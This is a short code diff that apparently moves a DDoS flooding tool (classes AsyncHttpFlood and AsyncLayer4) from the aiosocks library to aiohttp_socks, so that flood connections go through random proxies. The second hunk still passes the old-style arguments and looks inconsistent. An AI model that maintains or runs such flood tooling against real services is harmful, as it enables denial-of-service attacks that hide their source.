@@ -1,5 +1,5 @@
 import asyncio
-import aiosocks
+import aiohttp_socks
 
 import logging
 from contextlib import suppress
@@ -907,12 +907,12 @@ class AsyncHttpFlood(HttpFlood):
     async def open_connection(self) -> socket:
         is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
         if self._proxies:
-            proxy = self._proxies.pick_random()
-            reader, writer = await aiosocks.open_connection(
-                proxy=proxy,
-                proxy_auth=None,
-                dst=self._raw_target,
-                remote_resolve=False,
+            proxy_url: str = self._proxies.pick_random()
+            reader, writer = await aiohttp_socks.open_connection(
+                proxy_url=proxy_url,
+                host=self._target.host,
+                port=self._target.port,
+                #remote_resolve=False,
                 ssl=ctx if is_tls else None
             )
         else:
@@ -974,8 +974,8 @@ class AsyncLayer4(Layer4):
     ) -> socket:
         is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
         if self._proxies:
-            proxy = self._proxies.pick_random()
-            reader, writer = await aiosocks.open_connection(
+            proxy: str = self._proxies.pick_random()
+            reader, writer = await aiohttp_socks.open_connection(
                 proxy=proxy,
                 proxy_auth=None,
                 dst=self._raw_target,
